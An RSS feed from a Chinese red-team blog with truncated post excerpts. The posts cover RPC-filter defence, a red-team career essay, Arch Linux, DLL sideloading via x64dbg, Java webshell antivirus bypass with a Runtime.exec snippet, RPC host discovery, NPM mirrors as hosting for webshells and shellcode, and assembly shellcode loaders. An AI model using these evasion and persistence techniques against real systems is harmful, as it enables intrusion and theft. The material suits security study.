<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>倾旋的博客</title><link>https://payloads.online/</link><description>Recent content on 倾旋的博客</description><generator>Hugo</generator><language>zh-cn</language><copyright>倾旋 All rights reserved</copyright><lastBuildDate>Sun, 23 Oct 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://payloads.online/index.xml" rel="self" type="application/rss+xml"/><item><title>使用RPC Filter技术防御内网RPC横向攻击</title><link>https://payloads.online/archivers/2022-10-23/1/</link><pubDate>Sun, 23 Oct 2022 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2022-10-23/1/</guid><description>前言 Impacket工具包中所包含的内网横向技术大多都是依赖于RPC协议的，但对于RPC协议的攻击防御除了网络流量侧的检测识别以外，还可以通过Windows 内置的WFP(Windows Filtering Platform)技术。
这里提一下，流量测如何分析并防御impacket内网横向：https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/
关于RPC的攻击技术及漏洞整理了以下部分，使用RPC Filter可以达到阻断漏洞被利用和攻击的效果：
impacket-atexec 通过SMB协议认证，利用MS-TSCH RPC协议服务注册任务计划进行横向移动。 impacket-psexec 通过SMB协议认证，利用MS-SCMR RPC协议注册系统服务进行横向移动。 impacket-dcomexec 通过SMB认证，利用MS-DCOM RPC协议调用COM组件执行横向移动。 impacket-wmiexec 通过SMB认证，利用MS-DCOM RPC协议调用COM组件执行横向移动。 大名鼎鼎的PetitPotam CVE-2021-36942 利用MS-EFSRPC协议让服务器访问攻击者构造的地址进行NTLM重定向攻击。 PrintNightmare Windows Print Spooler权限提升漏洞（CVE-2021-1675），利用MS-RPRN进行提权，其原理也是通过调用RPC接口，让服务器访问特定的路径。 除了这类漏洞的利用，还有大部分的土豆提全系列都有使用到RPC接口，让系统SYSTEM特权进程访问攻击者构造的管道，然后进行令牌模拟，达到窃取Token然后提权的目的。 什么是WFP？ Windows Filtering Platform (WFP) is a network traffic processing platform designed to replace the Windows XP and Windows Server 2003 network traffic filtering interfaces. WFP consists of a set of hooks into the network stack and a filtering engine that coordinates network stack interactions.</description></item><item><title>我的三年红队生涯总结</title><link>https://payloads.online/archivers/2022-09-19/1/</link><pubDate>Mon, 19 Sep 2022 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2022-09-19/1/</guid><description>兴趣可以持续多久？ 在公司的某天有幸帮助公司的一级部门去给某学院的学生分享了一堂课，主要是关于自学安全的话题。开始的时候分享了我的一些学习经历，我发现总结不出来如何培养自己的自学能力，因为第一个大前提：我做的是我热爱的事情，在年龄很小的时候就找到了自己喜欢的事情，为此愿意花大量的时间去探索技术，不断的学习。
从大部分普通应届生的角度来看找工作这件事，他们的选择往往很少，找到一个相对好的工作取决于自身在后天的积累是否能与社会某个职业的需要挂钩，但好像大多数学校的学生反馈的是专业知识都与职场应用有一定偏差，这就导致就业难，人生第一大门槛：“我该去往何方？”
我对兴趣的理解是：“兴趣是人生不可或缺的调味剂，一定程度能够影响半生的幸福。”一个好的兴趣是针对事物抱有无尽求知欲的，并且具备隐性的持续性，在探索的过程中、过程后，一定是情绪高涨，快乐的。我很庆幸，在年纪很小的时候拥有了兴趣，在不断探索求知的过程中，我不断收获成就感，洗涤内心的卑微，使得一个少年变得逐渐强大。
兴趣让我有了更多的选择，我的兴趣不只是安全领域，更深层次的总结可以说是对计算机网络相关的东西都感兴趣，它能使我化身成为程序员、网络工程师、产品经理、渗透测试人员等等。有许多次我都感慨，这是一个幸福的时代。以上摘自：我的博客文章-《这是一个充满挑战的好时代》
接触网络安全行业已经有9年的时间，准确说计算机网络相关的技术是9年时间，起初在2013、2014年的时候并没有想过自己所学的技术或本领能发展成一个有体系的工作。在这个过程中，我的职业之路已经有5个年头，不论是在工作的时候或在上学的时候，都有经常做技术分享（文字、演讲）形式的输出，技术不断再提升、认知在不断扩展、学习的方法论在慢慢形成。
随着时间的推移自己的年龄也在增长，对于兴趣这个词的认识也越来越深刻。我认为兴趣始终是一个自我驱动力的一个重要来源，从好奇某个技术到了解认识再到掌握，整个过程需要源源不断的坚持和自我激励。不知道是在哪一年，我在网上读到一句话我很喜欢，于是把它当作个性签名用到了现在，内容是这样：“执着于理想，纯粹于当下。”国内的红队职业人群最早大部分是从掌握渗透测试技术的人员转型的一个发展通道，红队对于这些人群去做红队来说既能保持自己对技术的兴趣还能时常通过自己的知识成果获得大量正反馈，让自己无限接近一个真正意义上的“黑客”。
我想很多人都有一个黑客梦，这条路是一个甘愿承受寂寞，能十年磨一剑的理想之路。互联网人往往都是喜欢求变的，对比社会上所有的行业，我们这帮人走的捷径太多了、知道捷径的机会也太多了，所以更害怕自己走错路、走弯路。当自己使用技术解决了很多问题以后，这种思维惯性就越来越明显，网络安全行业经过这几年的迅速发展，我们都是获利者，总认为还有一个最优解自己还没有找到。
近几年接触管理工作以后，经常遇到兴趣和工作不能两全的境地，而兴趣又好像变成了一个奢侈品，在长大的这几年，忽然发现时间和精力、现实生活都需要得到平衡，总在工作和生活中的需要与被需要之间平衡。在这种平衡之间，我愈发觉得兴趣不能消失，在这三年的阶段里我的兴趣和红队工作是一种双螺旋结构的相互依存且稳定的关系，自己对热爱的执着也不能放下，它都是我人生中宝贵的奢侈品，兴趣我可以坚持追求一辈子，即便是追求或享受兴趣的形式改变了依旧要坚持下去。
红队是一个特殊的团队，做攻击和做防御到底哪个难？ 我对于红队的认识概括：红队是一群道德黑客组成的团体，主要目的是为了仿真网络空间中的攻击者所使用的技术来发现组织的安全问题。我工作中接触的很多朋友、客户、同事对于红队都不太了解，或者说与我认识的红队有一些差异，这里我想通过我三年建设红队和做红队的角度进行一个诠释。
为什么我说红队是一个特殊的团队，其实主要在于工作方式，而工作方式又受到环境因素的影响，宏观上近五年内由于行业对于网络安全人才的缺口激增、社会数字化转型加速，其实到今天红队体系建设还是在萌芽期，网络安全行业也是还在一个初步发展期。通过实战攻防演练的形式推动安全建设工作是起到了明显作用，这也意味着红队面临的挑战除了攻防演练的数量增加还有就是自身的能力要兼容不同安全建设水平的场景还要发挥明显作用。
微观上在这个环境因素下导致很多红队会怀疑自己是否还能继续做红队，其次就是发现自己所掌握的知识点面对工作的需求宛如冰山一角，因为大多数人都适应不了这个节奏，于是有人开始退出红队战场转型做防御生态相关的工作。除了精神上的考验还有体力上的考验，红队也像互联网行业一样有中年危机，面对防御水平高的目标时经常会深夜打闪电战，钻研技术时也都喜欢熬夜写代码等等，是因为晚上夜深人静，内心归于平静，大脑活动活跃，创作冲动或创造能力更加敏锐，年龄大一些的身体上可能就吃不消了。
还有性格方面，大多数红队性格都比较不善表达，大白话说就是容易一根筋，但这群人最难管理也最简单。之前在公司有人问我，你们红队到底谁技术最厉害？我回答：红队没有最厉害的，只有最适合的。没有哪个黑客可以达到全能，仅仅是能接近于全能，就像光速和“最快”还是有很大差距的，而这个差距是未知的，每个人都有擅长的领域，要看解决问题的场景而定。
再说回做攻击和做防御到底哪个难，我是觉得做攻击和做防御都难，这句好像是一句废话文学。我没有在甲方工作过，这里就写一写我在乙方红队工作中对于这个问题的一些感受。在实战攻防演练中，这两年0day漏洞攻击和社工/钓鱼的手段使用的越来越多，一方面是因为客户的安全建设开始有投入，暴露面得到收拢，不容易发现进入内网的漏洞，另外一方面是很多时候客户的需求会限定一些攻击手段或者限定攻击的范围。这里我还是搬出我对红队的理解，红队主要目的是为了仿真网络空间中的攻击者所使用的技术来发现组织的安全问题，那么在这些限定的条件下（时间、范围、攻击手段），必然不能仿真全部技术，所以项目的结果无法达到客户的预期，红队也很难出成果。在限定条件下想要获得全面的结果是不现实的，这是一个认知冲突。其实生活中的矛盾也都像这个问题一样有互通性。这里也抛出一个问题来解释，为什么很多红队宁更愿意做内网渗透？因为现在很多甲方的终端和内网的安全建设水平做的还不如边界资产的安全，红队可以发现很多安全问题、仿真许多攻击技术，得到更多的正反馈。
做红队的好处有哪些？ 做红队的好处其实有很多，由于环境因素，我仅是通过互联网了解国内的红队和国外的红队有一些差异，国外的红队可能更聚焦于企业安全视角的对抗，国内的红队既聚焦于实战演练又聚焦于企业红队。大量的红队选手既要进行攻防演练赛事的支撑，还要做企业红队，在我看来各有各的好处，攻防演练能将红队技术的运用更加发散，可以接触不同防御水平的场景，在发现安全问题的同时对红队的技术能力得到全面锻炼，而且还有监管单位背书。在做企业红队的时候节奏就不像攻防演练那样需要短时间内出成果，PK的火药味没有那么浓烈，反而遇到的有趣问题比较多。
记得某次在客户现场做企业红队的时候，运用到了一个通过任务计划下发程序，弹出诱导用户输入明文凭据然后将凭据回传，而这个程序没有现成的，就临时写了一个MFC窗口。这种场景运用到的技术在需要快速出成果的监管部门举办的攻防演练中一般不会用到，主要是时间比较紧凑，红队人员精力有限，不会在一个目标上花费太多精力。
总体来看，红队可以接触许多场景，能力可以发散成长，可以工作中找到自己感兴趣的方向。除了实战锻炼，红队还需要研究各种BYPASS技巧，使得技术手段可以绕过防御的检测和拦截，这对于掌握安全研究技能是一个很好的切入点。
在2021年的总结我写道：“做安全研究工作非常需要知识的提炼能力，这一点至关重要，如今的计算机高速发展、硬件软件架构依赖性错综复杂，要解决问题需要在研究的过程中过滤很多的重点知识，比较考验计算机网络的基础知识，能做好基础知识的归纳总结，并且还能够做好布道者这一角色，尤为重要。大部分非科班出身且没有接受完整应试教育的人，都不会去搞枯燥的研究，宁愿做一个一直以经验增长为核心能力的人。说了那么多，其实我想表达的是要时刻对自己的工作有要求、有目标，对于团队的成员，我鼓励每一个人去做自我驱动的事情，热情也好、兴趣也好、爱好也好，这便是一种幸福。
有时候我会思考做安全研究到底需不需要天赋，用什么标准衡量有天赋还是没天赋？研究这个问题前，我认为应该先给安全研究做一个鲜明的定义。首先，研究工作的成果影响力是巨大的，影响力又同样取决于研究问题的微观程度，这个微观程度的小指的是我们人类对研究对象认知的深度。
例如宇宙的形成、万有引力、生物遗传等等，而计算机要解决的问题是如何更高效的计算，安全研究仅是从多个维度上（人、资产、流程）上发现安全问题、快速发现安全问题、解决安全问题、快速解决安全问题、根除安全问题。红队安全研究，大部分仅涉及发现安全问题、快速发现安全问题。因此，安全研究的定义随之而来，为了发现或解决安全问题而去做的研究工作。那么，搞安全研究真的需要天赋么？我觉得天赋其实不太重要，从人类基数上来看天才是永远占少数的，尽管很多人都想着自己能成为天才、或者他自己本身就是天才，我想我最大可能（100%）就是最平凡的大多数，这个问题就不那么重要了（逻辑鬼才）。“
关于BYPASS的安全研究和漏洞挖掘工作都需要一个真实的环境，红队会使用很多虚拟化软件承载自己的实验平台，但无法直接模拟整个企业的防御环境进行对抗，尤其是网络流量的防御能力不能很好的模拟，所以大多数红队都会关注终端安全方向。在研究或者挖掘漏洞的过程中，红队会需要编程技能辅助自己进行自动化以提升效率，大部分红队都会掌握一门或多门短平快的脚本语言、编译型语言。这些杂项技能让红队看起来是全能型的，也会营造出一个全能黑客的假象。在红队工作中不断的解决问题，会让自己形成主动学习、主动研究的习惯，这种习惯是后天磨砺出来的，终身受用。
红队的价值是什么？ 这里要展开说两方面，一方面是针对红队雇主内部的价值，一方面是客户的价值。
对雇主内部的价值，主要能够体现在帮助企业获得影响力、发现的诸多安全问题来促进商机、产品能力提升、直接业绩。在我经历的三年红队生涯中，红队产生的直接业绩是微乎其微的，反而走影响力的这个路线走的很好。影响力、品牌、商机，这些都是隐性价值，其他人（大部分业绩部门）无法直观感受到红队的重要性，红队不参与商务的大部分流程，所以红队对数字的敏感度不如业务属性部门。如果直接考核红队的直接业绩，那么影响力的效果可能不会那么理想。
再说道产品能力提升，很多厂商的产品部门多少都会遇到自己的产品无法发挥拳头作用，缺少有经验的人参与实战打磨，这个时候就需要红队将自己所掌握的技术赋能到产品，提升产品的能力和防护策略的有效性。经历了这两年的疫情对经济的打击，安全行业市场发展走低，但红队人员的成本是在持续走高的，这时候一个冲突结点随之出现……
红队对客户的价值，红队可以仿真网络空间中的攻击者所使用的技术来发现客户的安全问题，对于有想对企业整体安全评估需求的客户，可以选择红队进行服务。这里整体指的是最大范围的整体，凡是可以影响到安全问题的所有实体，包括但不限于：系统、网络、人员、流程制度等等。
最初我在设计评估方案的时候，理想的评估周期是半个月或一个月，后来攻防演练的频繁出镜，客户更容易接受多家PK竞争的模式，这种模式利好买家，评估周期就会变成一周或者最长一周半，假设还是金融行业的银行客户，这对于红队想要发现严重级别的安全问题要求就更高了。
我的红队三年生涯 任何一份工作都是阶段性的，这五年的工作经历中，面对不同的同事都有聊到过一个话题：“你的三年/五年规划是什么？”第一份和第二份工作我对三年五载的规划都没有太明显的感受，起初我毫无方向，就像天空中漂浮的蒲公英，随风而去、随遇而安的样子，在飘荡的日子里也曾做过很多冲动的抉择，为什么我要用冲动这个词，冲动代表了是过去的自己做出了在那个时段正确的决定。在毫无方向的时候，冲动不是一个坏处，反而要犯错改错才能成长。倘若是经常否定自己做错了、选错了，那好像也很难再进步。
人生都有一个核心的问题：“我从哪里来，我要到哪里去。”我理解这句话的意思应该是我为何来到世间，我要到世间哪个地方去。工作了第5个年头我终于理解三年五载的规划代表了什么含义，是想让自己能有一个清晰的目标去奋斗、去改变，即便是自己的认知每天都在提升，也要做一做规划，写一写想法。时至今日，我认为当初决定做红队的选择依然正确。
2019的部分总结：我非常热爱技术，什么都想会一点，至今为止都觉得全能高手是存在的，也不会浮躁，只优先选择自己热爱的，这点是有些固执的，时常沉浸其中、乐在其中，做技术带给我的反馈有很多，它不断的印证一就是一，不管如何都不会变成二。其次，不断印证类似于成功学中的大道理，努力就有收获之类的话题。技术是我的爱好，而我的工作建设在爱好之上，这对于许多人来说是多么幸福的一件事啊。但有一天我开始怀疑，因为我从一个前辈身上感受到，他除了有和我相同类似的工作的同时，还拥有一个更热爱的爱好，我觉得这是对幸福的一种加持。我开始觉得工作与爱好的融合会让爱好变得浑浊，不那么纯粹。工作是有棱角的，而爱好是没有棱角的。这样的情况普遍也很多，这倒也还算过得去。
2020年的部分总结：从2020年X月起初到2020年X月份，实验室成员目前达到X人，现有工作需求的技术都慢慢开始饱和。从年初刚开始的X人发展到X人，期间遇到项目上、管理上的许多问题，问题的最初在我自身，在明确方向的工作上和需要执行的工作上没有平衡，欠缺思考的时间。通过逐步的现象总结，能够解决一部分问题，强调了关于部门价值观、绩效考核、工作效率等等问题，但这种方式不能够持续解决已经遇到过的问题，于是开始落地标准化来形成管理工具，我发现我的日常思考的结果是存在某些管理框架内的，是有特定的方法的，这对于我自身是很大的提升。
个人技能：从去年到现在一直在推荐落地Demo这块工作，我发现内部已经形成感染力，对于一些研究、实战的需求有了更多的思考。从技术成长的角度来看，需要发展成为“T”字型人才，这样才能应对更多的考验，自身擅长的方向有一定沉淀，以“专精之余而触类旁通”来规划自己一个阶段的学习方向，管理好精力与时间是我有待练习和加强的。
2021年的部分总结：每一个企业都有战略资源部门，我理解的战略资源部门是这个部门的能力具备稀缺性的，复制需要巨大成本，如果利用得当，会产生巨大增益，反之当战略资源投入的衡量方式有问题就会产生战略资源部门管理上的压力，我所处于的就是一个战略资源部门，我长期以来遇到最大的问题就是关于战略价值的衡量，哪种类型的项目需要投入多少资源可能是项目管理上屡见不鲜的问题，对于PM来说，解决这种问题一定是有现成的公式或者工具，但作为一个Leader，考虑的因素就要多很多了，尤其是团队平均年龄比较年轻的，要为大家争取最大的利益，而且这种利益还可能是一种不可见的长远利益，你不能奢求大多数人可以理解，多数的牺牲是看不见的。
我解决这个问题的办法是不断的跨部门沟通，项目分级定义，投入产出对赌，跨部门的效果达到预期以后，我的成就感油然而生，即使在解决的过程中因为自己并不擅长，多次想过要逃避、斗争，但都坚持了下来，因为比起自己看不起自己，更怕的是无法回应太多人的期待。解决完成后，我就开始思考如何让团队的定位和目标更明确，让大家做的事儿更有边界，更贴合自身预期。于是在近年末的期间，让大家开始定制规划2022年的目标，将更多的力量投入到中台建设工作上来，这可能是对大家也是一个不小的挑战，尤其在思维上、技术上，相信大家一定可以。
这里简单晒一下我在今年离职前做职级晋升准备上报的近两年重点工作成果（日常交付项目除外）：
一、业绩成果：
2021年大型攻防演练现场牵头，作为现场队长将传递有效信息到后端，现场编写技战法与报告整理，且代表公司获得HW BP讲师称号及证书 2022年大型攻防演练总牵头，前期预算申报、人员分组、方案制定、质量把控，带领团队拉通各部门进行红队工作 二、机制建设：
业绩承诺机制管理规定发布，明确了XX中心与XX中心内部，在红队资源申请及业绩承诺机制之间的基本原则，用于规范红队支撑，最大限度优化、聚焦红队资源，使之发挥最优的价值。指导红队支撑工作中产生的各类费用核算方法，XX中心、XX中心、XX部、XX部应按照本规定落实相关的核算工作，并逐步推进财务核算精细化管理。 持续推进红队中台能力建设，XX实验室红队平台的功能评审、需求反馈、漏洞和工具与XX实验室KPI绑定，辅助XX实验室持续迭代平台，至今已初步发挥价值，有用户且有业绩 公司红队梯队建设，在X总的建议下，与其他同事制定了XX中心红队的梯队建设模式、红队激励覆盖范围等机制 红队漏洞储备机制建设，设定XX实验室漏洞挖掘KPI，明确产出，并且提供到XX实验室漏洞平台，建立0day漏洞申请机制 三、影响力
对外： 编写红队彩虹书增加公司对外影响力，2021年编写红队彩虹书成功发布、2022年年初负责牵头编写红队彩虹书，跟进修订、修改，最终成功上市发布 对内：任职资格标准修订，作为标准修订组长角色对2021年的任职资格标准重新修订，为红队方向发展人员提供晋升参考
这三年不仅具备了相对丰富的红队技术和业务经验，也尝试了一线的管理工作，往日与大家战斗的日子历历在目，在公司不知看过多少次日出，享受过红队那份荣耀、维护过红队那份骄傲，我的故事留在了这里，感恩那些包容过我的朋友、同事们，所有的离别都是为了更好的相遇……</description></item><item><title>分享一下最近使用Arch Linux的感受</title><link>https://payloads.online/archivers/2022-09-03/1/</link><pubDate>Sat, 03 Sep 2022 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2022-09-03/1/</guid><description>Arch Linux是一款基于x86-64架构的Linux发行版。系统主要由自由和开源软件组成，支持社区参与。系统设计以KISS原则（保持简单和愚蠢）为总体指导原则，注重代码正确、优雅和极简主义，期待用户能够愿意去理解系统的操作。Arch Linux系统安装、删除和更新软件的软件包管理器叫做pacman。
Arch Linux采用滚动发行模式来获取系统更新和软件的最新版本。系统安装映像只简单地包含系统主要组件。
Arch Linux以社区Wiki的形式提供文档，称为Arch Wiki。该Wiki经常编有特定主题的最新信息，受到了Linux社区的广泛认可，内容也应用在Arch Linux以外的领域。
去年在@三米前有蕉皮的推荐下，开始正式使用Arch Linux，起初在安装的过程中是有一些不适应的，以往使用最多的Linux发行版就是Debain系列（主要以Ubuntu为主），在安装方面Ubuntu做了很多的优化，可以像Windows那样快速分区、快速安装系统。但Arch Linux就不一样了，安装过程中所有步骤都需要亲历亲为，这一点能让我更加了解Linux，参照官方的WiKi可以配置出更适合自己的操作系统。
Arch Linux在软件更新方面也非常出众，它存在两种软件源，一种是被纳入了官方社区的软件包，另外一种则是用户自己发布的软件包（AUR），AUR的包越受欢迎、更多人投票支持会被纳入官方社区的软件包，因此官方社区的软件包更加的可靠、安全。Arch Linux使用pacman作为包管理器，同样的还有一些图形界面的软件包管理器，每天都会有最新的软件包更新，可以通过sudo pacman -Syu 更新操作系统。采用滚动发行模式最大的优点就是可以随时体验到所有软件的最新特性，虽说很多人会觉得滚动更新可能会导致系统崩溃或某些功能无法正常使用，但我用了一年多都没有发生类似的问题，这可能与用户安装的软件源有关系，况且我使用的软件较少。
例如：metasploit 、sqlmap 、nmap 、impacket等等大部分工具都已经集成到了官方社区，都可以直接安装。
Arch Linux的桌面环境有很多中，取决于你喜欢什么桌面环境（KDE、gnome、xfce…），我个人比较喜欢xfce4，它和Kali Linux现在的最新版所使用的桌面环境是一致的，意味着关于xfce的配置我能直接Copy Kali Linux的。
最近将自己写的软件发布到了AUR，可以直接通过AUR安装工具进行安装：
AUR仓库地址：https://aur.archlinux.org/packages/red-tldr
游戏方面，当属Steam为主了，只要是支持Linux平台的都可以完美运行。
支持Linux的大作游戏并不多，如果是重度游戏患者可能不太适合Linux，对于我而言，Arch Linux未来可能会陪伴我走很多年。
我安装的软件包列表都在Github仓库自动更新：https://github.com/Rvn0xsy/pacman-pkg</description></item><item><title>x64dbg中的白加黑利用</title><link>https://payloads.online/archivers/2022-08-17/1/</link><pubDate>Wed, 17 Aug 2022 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2022-08-17/1/</guid><description>0x00 何谓白加黑？ 在木马样本与杀毒软件的对抗中，再隐蔽的木马在被发现的那一刻，它的这一生就结束了。杀毒软件厂商通过SHA1/2、MD5等算法取得样本的唯一值来构建云端的特征库，当下一次攻击发生时，将会通过特征库进行比对，因此成本对抗不言而喻，红队的木马需要重新修改、编译，大大增加了对抗的时间、精力，这就是威胁情报的一种价值。反观有些软件确实会需要开发一些敏感行为的功能，如修改注册表、屏幕录像截图但这些是用户知情且授权的行为，这时杀毒软件再进行拦截的话，将大大降低软件使用的体验，所以出现了软件签名技术可以解决这类问题，当然软件签名技术不仅仅是为了只解决这一个问题而出现的。有些APT组织会通过控制软件开发商的代码仓库进行投毒或者通过入侵软件开发商来窃取签名，给自己的木马加上签名验证，杀毒软件遇到签名将会默认信任这个程序。但攻击软件开发商所需要投入的成本也相对比较高，telegram上也出现了花钱签名的服务，不过白嫖怪的数量可比金主爸爸要多，白嫖怪为了得到一个可以以签名程序运行自己任意代码的条件就会去挖掘一些软件厂商的程序是否存在DLL劫持漏洞，利用DLL劫持的特性达到披着羊皮的狼的目的。现阶段基本上大多数的APT组织在进行权限维持都会采用白加黑的技术来绕过杀毒软件的拦截和检测（特殊行为除外）。本文将会分享一个关于x64dbg这款调试工具的白加黑利用技巧。
0x02 x64dbg的DLL加载组件 x64dbg 是一个开源的Windows平台下的调试工具，相比于OllyDbg我更喜欢x64dbg。打开x64dbg的目录，可以看到有一个loaddll.exe程序，顾名思义，它一定具有dll加载的功能。
在跟进到它的源代码：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include &amp;lt;windows.h&amp;gt; wchar_t szLibraryPath[512]; int main() { wchar_t szName[256]; wsprintfW(szName, L&amp;#34;Local\\szLibraryName%X&amp;#34;, (unsigned int)GetCurrentProcessId()); HANDLE hMapFile = OpenFileMappingW(FILE_MAP_READ, false, szName); if(hMapFile) { const wchar_t* szLibraryPathMapping = (const wchar_t*)MapViewOfFile(hMapFile, FILE_MAP_READ, 0, 0, sizeof(szLibraryPath)); if(szLibraryPathMapping) { lstrcpyW(szLibraryPath, szLibraryPathMapping); UnmapViewOfFile(szLibraryPathMapping); } CloseHandle(hMapFile); } if(szLibraryPath[0]) return (LoadLibraryW(szLibraryPath) !</description></item><item><title>通过动态链接库绕过反病毒软件Hook - Break JVM</title><link>https://payloads.online/archivers/2022-08-11/1/</link><pubDate>Thu, 11 Aug 2022 17:23:32 +0800</pubDate><guid>https://payloads.online/archivers/2022-08-11/1/</guid><description>0x00 前言 通常情况下获得Java Webshell碰到数字杀毒的场景居多，在这个环境中经常会遇到无法执行命令或命令被拦截的情况，很多小伙伴遇到这个问题就劝退了，我猜测是有一套进程链的检测方式导致了命令无法执行，于是去查看Java的文档，查阅到Java能够加载动态链接库且能够执行动态链接库中的代码，本文演示如何利用Java加载动态链接库的方式实现绕过了数字杀毒的拦截，但在演示之前，需要铺垫一些基础知识，如：猜想的进程链、Windows错误代码、Java加载动态链接库常见的三种办法、Windows动态链接库、土豆提权原理、命名管道技术等。
0x01 猜想的进程链 在获取Webshell以后，一般执行命令都会调用 Runtime.exec ，当然也有其他的命令执行方式，这里不再讨论，执行的命令一般分为两种：
系统自带的PE文件，后面跟上参数 CMD或Powershell中内置的命令 例如：dir 命令与forfiles命令，这两个命令都可以列出文件夹内的文件，但要执行 dir 需要启动 cmd.exe 或者 powershell.exe ，执行的过程中进程链就像这样：
在这个过程里，进程的链是java.exe创建了cmd.exe ，那么很容易就能发现问题，每执行一条命了都会创建一个cmd.exe 的进程。从Runtime.exec 执行命令到Windows API CreateProcess 创建cmd.exe这个进程是通过JVM翻译过来的，数字杀毒会Hook CreateProcess API达到监控拦截的目的。
而forfiles是一个PE文件，不是CMD内置的命令，所以不需要创建cmd.exe也可以执行，它的进程链会是这样：
达到了同样的目的，但是没有创建cmd.exe ，为了体验上的考量现在的大部分Webshell管理工具执行命令都是要创建cmd.exe的，那么如何让我们的操作都不创建cmd.exe呢？
其实只需要改一下原来的小马即可：
1 2 3 4 5 6 7 8 9 public static void main(String[] args) { try { // String cmdStr = &amp;#34;cmd.exe /c forfiles.exe /p C:\\&amp;#34; ; String cmdStr = &amp;#34;forfiles.exe /p C:\\&amp;#34; ; Runtime.getRuntime().exec(cmdStr); }catch(Exception e){ e.printStackTrace(); } } 这样虽然不会创建进程，但大部分命令还是会拦截，例如：net.</description></item><item><title>通过Windows RPC批量寻找“出网”机器</title><link>https://payloads.online/archivers/2022-03-04/1/</link><pubDate>Fri, 04 Mar 2022 17:23:32 +0800</pubDate><guid>https://payloads.online/archivers/2022-03-04/1/</guid><description>0x00 Windows RPC RPC（Remote Procedure Call）远程过程调用协议，一种通过网络从远程计算机上请求服务，而不需要了解底层网络技术的协议。RPC它假定某些协议的存在，例如TCP/UDP等，为通信程序之间携带信息数据。在OSI网络七层模型中，RPC跨越了传输层和应用层，RPC使得开发，包括网络分布式多程序在内的应用程序更加容易。在Windows操作系统中，RPC（Remote Procedure Call） 已经存在了许久，一些漏洞挖掘研究员也已经将RPC相关的漏洞挖的差不多了。但是想要调用Windows RPC接口完成某些事情，我感觉比直接使用Windows API麻烦很多，最近一直在看Windows RPC相关的知识，也实现了一些小工具，但最终我发现还是impacket香！
Windows RPC实现的小工具-远程/本地创建任务计划：
在本文开始之前，不得不提一下之前的文章也是调用的Windows RPC接口：通过OXID解析器获取Windows远程主机上网卡地址
0x01 实验环境 操作系统 IP地址 Kali Linux 192.168.117.139 Windows 10 192.168.117.141 假设Kali Linux具有192.168.117.0/24网段内的通用口令凭据，只有Windows 10可以访问互联网，那么常规的办法就是逐个让这些机器访问某个互联网地址，然后看哪一个请求成功了，最终请求成功的那个必定是可以访问互联网的。通过常规办法会有比较大的“动静”，也可能需要落地一些文件，产生更多的日志。
0x02 通过RpcOpenPrinter作为代理访问 RpcOpenPrinter 是一个工作在MS-RPRN协议下的监视打印机的句柄方法，方法定义如下：
1 2 3 4 5 6 7 DWORD RpcOpenPrinter( [in, string, unique] STRING_HANDLE pPrinterName, [out] PRINTER_HANDLE* pHandle, [in, string, unique] wchar_t* pDatatype, [in] DEVMODE_CONTAINER* pDevModeContainer, [in] DWORD AccessRequired ); 第一个参数pPrinterName是打印机的地址，格式支持:
Domain Name System (DNS) NetBIOS Internet Protocol version 4 (IPv4) Internet Protocol version 6 (IPv6) Universal Naming Convention (UNC) STRING_HANDLE 的定义类型：</description></item><item><title>利用NPM仓库充当文件托管服务</title><link>https://payloads.online/archivers/2022-03-01/1/</link><pubDate>Tue, 01 Mar 2022 17:23:32 +0800</pubDate><guid>https://payloads.online/archivers/2022-03-01/1/</guid><description>0x00 什么是NPM？ NPM是随同NodeJS一起安装的包管理工具，NPM可以通过NPM的源下载安装源上发布的JS代码。目前官方源的地址是：https://www.npmjs.com/ 任何人都可以在社区上发布自己的Nodejs代码，但NPM官方的服务器是在境外的，国内想要快速的访问到就必须通过同步源，于是出现了各种NPM镜像源，每隔一段时间就会拉取官方的源同步。既然任何人都可以发布自己的代码到NPM上，我们就可以把NPM的仓库当作一个简单的文件服务器存储一些能够适当公开的静态文件。
0x01 托管代码前的准备工作 NPM的认证机制是双因素的（密码+邮箱验证码），注册的时候需要提供真实邮箱：https://www.npmjs.com/signup
注册完毕后，本地安装好NPM环境：sudo apt install npm
本地登录NPM：npm login 同样会需要邮箱验证码
0x02 托管第一个静态文件 新建一个包名的目录，注意包名不能与NPM官方源上发布的包名同步
这里我新建目录名为 my-npm
npm init 可以初始化一个包的基本信息，例如版本号、作者、描述、测试命令等等。
在设置package name时为了怕重复，我设置包名为touch-file。
可以看到已经生成了package.json这个包的基础信息文件，接下来可以继续创建这个包内的其他文件，这里我随便写了一个index.js。
npm publish 用于发布这个包。
0x03 如何使用静态文件？ NPM有很多源，这里我随便写几个：
https://cdn.jsdelivr.net/npm/touch-file@1.0.0/index.js https://mirrors.cloud.tencent.com/npm/touch-file https://r.cnpmjs.org/touch-file https://mirrors.cloud.tencent.com/npm/touch-file https://repo.huaweicloud.com/repository/npm/touch-file/-/touch-file-1.0.0.tgz 可以看到至少阿里、腾讯是有NPM同步的，但是文件是压缩包，而jsdelivr可以直接访问源文件，这一点可以当作图床、文件传输&amp;hellip;. 我博客的图床就是用的Github + jsdelivr进行加速。
发挥想象：
免费图床 文件下载服务器（小工具、webshell、shellcode?） JS后门&amp;hellip; &amp;hellip;. PS：如果遇到不太正常的NPM，可以通过Report举报滥用。</description></item><item><title>静态恶意代码逃逸（第十一课）- 汇编语言编写Shellcode加载器</title><link>https://payloads.online/archivers/2022-02-16/1/</link><pubDate>Wed, 16 Feb 2022 17:23:32 +0800</pubDate><guid>https://payloads.online/archivers/2022-02-16/1/</guid><description>代码将会上传至Github，方便读者下载研究 : https://github.com/Rvn0xsy/BadCode
0x00 NASM与MASM NASM与MASM是一个汇编器，能够将汇编代码转换为能够被CPU执行的（目标代码）二进制代码，NASM目前是由H. Peter Anvin提供支持，与MASM相对来说较为自由。MASM是由微软推出，但已经许久没有更新，我开始是从MASM开始看，但是有些书籍会举例很多伪汇编的例子，这不能让我很好的锻炼汇编语言，MASM提供了很多的伪汇编语法，这块我直接跳过，伪汇编代码给我的感觉像是在写C语言。
